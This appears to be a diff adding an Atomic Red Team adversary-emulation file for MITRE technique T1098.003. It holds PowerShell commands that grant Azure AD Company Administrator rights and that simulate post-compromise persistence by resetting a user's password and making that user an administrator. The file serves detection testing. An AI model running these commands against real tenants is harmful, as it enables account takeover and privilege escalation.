@@ -1,0 +1,117 @@
+attack_technique: T1098.003
+display_name: 'Account Manipulation: Additional Cloud Roles'
+atomic_tests:
+- name: Azure AD - Add Company Administrator Role to a user
+  auto_generated_guid: 4d77f913-56f5-4a14-b4b1-bf7bb24298ad
+  description: |
+    Add an existing Azure user account the Company Administrator Role.
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    username:
+      description: Azure AD username
+      type: string
+      default: jonh@contoso.com
+    password:
+      description: Azure AD password
+      type: string
+      default: p4sswd
+    target_user:
+      description: Name of the user who will be assigned the Company Admin role
+      type: string
+      default: default
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+     MSOnline module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name MSOnline -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name MSOnline -Force
+  executor:
+    command: |
+      Import-Module MSOnline
+      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
+      Connect-MsolService -Credential $Credential
+      Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress "#{target_user}"
+    cleanup_command: |
+      Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType User -RoleMemberEmailAddress "#{target_user}"
+    name: powershell
+    elevation_required: false
+- name: Simulate - Post BEC persistence via user password reset followed by user added to company administrator role
+  auto_generated_guid: 14f3af20-61f1-45b8-ad31-4637815f3f44
+  description: |
+    This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.
+     Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    auth_username:
+      description: Azure AD username used to conduct the adversary activity
+      type: string
+      default: jonh@contoso.com
+    auth_password:
+      description: Azure AD password for user auth_username
+      type: string
+      default: p4sswd
+    target_user:
+      description: Name of the user whose password be reset and added to the admin role.
+      type: string
+      default: default
+    target_password:
+      description: The password that the user target_user will be reset to.
+      type: string
+      default: Ohn05GeMe#$
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+     MSOnline and AzureAD modules must be installed.
+    prereq_command: |
+      $required_mods = 'AzureAD', 'MSOnline'
+      $installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)
+      $notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue
+
+      if ($notInstalled) {
+      # Prompt for installing the missing ones.
+      Write-Output "The following PS modules aren't currently installed:"
+      $notInstalled
+        exit 1
+      }
+
+       else{
+        Write-Output "All required PS modules are installed"
+        exit 0
+       }
+    get_prereq_command: |
+      Install-Module -Name MSOnline -Scope CurrentUser -Force
+      Install-Module -Name AzureAD -Scope CurrentUser -Force
+  executor:
+    command: |
+      Import-Module MSOnline
+      Import-Module AzureAD
+      $password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force
+      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{auth_username}", $password
+      $targetsecurepw = ConvertTo-SecureString -String "#{target_password}" -AsPlainText -Force
+      Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue
+      Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue
+      
+      #Saving the ObjectId of the target_user into a variable
+      $target_objid = Get-AzureADUser -filter "userPrincipalName eq '#{target_user}'" | Select-Object -ExpandProperty ObjectId
+      
+      #Reset the password of the target_user
+      Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue
+    
+      #Adding target_user
+      Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress "#{target_user}"
+      Add-MsolRoleMember -RoleName "Global Reader" -RoleMemberEmailAddress "#{target_user}"
+
+    cleanup_command: |
+      Import-Module MSOnline
+      $password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force
+      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{auth_username}", $password
+      Connect-MsolService -Credential $credential
+      Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType User -RoleMemberEmailAddress "#{target_user}"
+      Remove-MsolRoleMember -RoleName "Global Reader" -RoleMemberType User -RoleMemberEmailAddress "#{target_user}"
+    name: powershell
+    elevation_required: false
